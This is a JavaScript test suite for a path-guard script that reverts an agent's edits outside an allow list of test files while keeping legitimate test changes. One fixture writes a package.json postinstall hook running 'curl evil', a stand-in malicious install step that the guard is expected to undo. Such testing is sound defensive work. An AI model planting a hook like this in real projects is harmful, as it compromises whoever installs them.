import assert from 'node:assert/strict'
import { existsSync, readFileSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { test } from 'node:test'
import { commit, git, outputs, readJson, runScript, tempRepo, write } from './helpers.mjs'

const files = {
  '.gitignore': '.agent/\n', // as in the real repository
  'backend/src/features/todos/router.ts': 'export const router = 1\n',
  'backend/src/core/config.ts': 'export const config = 1\n',
  'backend/tests/router.test.ts': 'router test\n',
  'backend/tests/config.test.ts': 'config test\n',
  'backend/tests/fixture.ts': 'fixture\n',
  'backend/package.json': '{}\n',
  'frontend/src/lib/http.ts': 'http\n',
  'frontend/src/lib/http.test.ts': 'http test\n',
  'frontend/src/components/Card.tsx': 'card\n',
  'frontend/src/components/Card.test.tsx': 'card test\n',
  'frontend/src/test/queryWrapper.tsx': 'helper\n',
  'frontend/src/design-system/mocks.tsx': 'mocks\n',
  '.github/workflows/ci.yml': 'name: CI\n',
}

function guard(dir) {
  const { code, stdout, stderr } = runScript(dir, 'guard-paths.sh')
  assert.equal(code, 0, stderr)
  return { ...readJson(join(dir, '.agent/guard.json')), outputs: outputs(stdout), status: git(dir, 'status', '--porcelain') }
}

const read = (dir, path) => readFileSync(join(dir, path), 'utf8')

test('keeps new and edited files on the test allow list', (t) => {
  const dir = tempRepo(t, files)
  write(dir, {
    'backend/tests/router.test.ts': 'router test v2\n',
    'backend/tests/health.test.ts': 'new\n',
    'frontend/src/lib/http.test.ts': 'http test v2\n',
    'frontend/src/features/x/useThing.test.ts': 'new hook test\n',
    'frontend/src/test/server.ts': 'new helper\n',
    'frontend/src/design-system/mocks.tsx': 'mocks v2\n',
  })
  const result = guard(dir)
  assert.deepEqual(result.violations, [])
  assert.equal(result.kept.length, 6)
  assert.equal(result.outputs.changed, 'true')
  assert.equal(result.outputs.violations, '0')
})

test('restores edits outside the allow list and removes new files there', (t) => {
  const dir = tempRepo(t, files)
  write(dir, {
    'backend/src/features/todos/router.ts': 'export const router = "hacked"\n',
    'backend/package.json': '{"scripts":{"postinstall":"curl evil"}}\n',
    '.github/workflows/ci.yml': 'name: owned\n',
    'frontend/src/lib/evil.ts': 'new source file\n',
    'backend/tests/nested/deep.test.ts': 'not flat\n',
    'backend/tests/router.test.ts': 'legit edit\n',
  })
  const result = guard(dir)
  assert.deepEqual(result.kept, ['backend/tests/router.test.ts'])
  assert.equal(result.violations.length, 5)
  assert.equal(read(dir, 'backend/src/features/todos/router.ts'), 'export const router = 1\n')
  assert.equal(read(dir, 'backend/package.json'), '{}\n')
  assert.equal(read(dir, '.github/workflows/ci.yml'), 'name: CI\n')
  assert.equal(existsSync(join(dir, 'frontend/src/lib/evil.ts')), false)
  assert.equal(existsSync(join(dir, 'backend/tests/nested/deep.test.ts')), false)
  assert.equal(result.status, 'M backend/tests/router.test.ts')
})

test('restores a staged source deletion made with git rm', (t) => {
  const dir = tempRepo(t, files)
  git(dir, 'rm', '-q', 'backend/src/core/config.ts')
  const result = guard(dir)
  assert.deepEqual(result.violations, ['backend/src/core/config.ts (deleted)'])
  assert.equal(read(dir, 'backend/src/core/config.ts'), 'export const config = 1\n')
  assert.equal(result.status, '')
  assert.equal(result.outputs.changed, 'false')
})

test('refuses to delete a test whose source still exists', (t) => {
  const dir = tempRepo(t, files)
  git(dir, 'rm', '-q', 'backend/tests/config.test.ts')
  rmSync(join(dir, 'frontend/src/components/Card.test.tsx'))
  const result = guard(dir)
  assert.deepEqual(result.deleted, [])
  assert.equal(result.violations.length, 2)
  assert.equal(read(dir, 'backend/tests/config.test.ts'), 'config test\n')
  assert.equal(read(dir, 'frontend/src/components/Card.test.tsx'), 'card test\n')
})

test('allows deleting stale tests once the PR removed their source', (t) => {
  const dir = tempRepo(t, files)
  rmSync(join(dir, 'backend/src/core/config.ts'))
  rmSync(join(dir, 'frontend/src/components/Card.tsx'))
  commit(dir, 'PR deletes two modules')
  git(dir, 'rm', '-q', 'backend/tests/config.test.ts')
  rmSync(join(dir, 'frontend/src/components/Card.test.tsx'))
  const result = guard(dir)
  assert.deepEqual(result.violations, [])
  assert.deepEqual(result.deleted.sort(), ['backend/tests/config.test.ts', 'frontend/src/components/Card.test.tsx'])
  assert.equal(result.outputs.changed, 'true')
})

test('never deletes shared test helpers, even when nothing imports them', (t) => {
  const dir = tempRepo(t, files)
  git(dir, 'rm', '-q', 'backend/tests/fixture.ts', 'frontend/src/test/queryWrapper.tsx', 'frontend/src/design-system/mocks.tsx')
  const result = guard(dir)
  assert.equal(result.violations.length, 3)
  assert.deepEqual(result.deleted, [])
  assert.equal(result.status, '')
})

test('handles a rename: the old path is a deletion and the new path an addition', (t) => {
  const dir = tempRepo(t, files)
  git(dir, 'mv', 'backend/tests/router.test.ts', 'backend/src/router.test.ts')
  const result = guard(dir)
  assert.deepEqual(result.violations.sort(), ['backend/src/router.test.ts', 'backend/tests/router.test.ts (deleted)'])
  assert.equal(read(dir, 'backend/tests/router.test.ts'), 'router test\n')
  assert.equal(existsSync(join(dir, 'backend/src/router.test.ts')), false)
  assert.equal(result.status, '')
})

test('ignores the workflow working directory and coverage output', (t) => {
  const dir = tempRepo(t, files)
  write(dir, { 'backend/coverage/coverage-summary.json': '{}', '.agent/report.json': '{}' })
  const result = guard(dir)
  assert.deepEqual(result, { ...result, violations: [], kept: [], deleted: [] })
})

test('copes with paths that contain spaces', (t) => {
  const dir = tempRepo(t, files)
  write(dir, { 'frontend/src/odd dir/My Card.test.tsx': 'ok\n', 'frontend/src/odd dir/My Card.tsx': 'not ok\n' })
  const result = guard(dir)
  assert.deepEqual(result.kept, ['frontend/src/odd dir/My Card.test.tsx'])
  assert.deepEqual(result.violations, ['frontend/src/odd dir/My Card.tsx'])
})
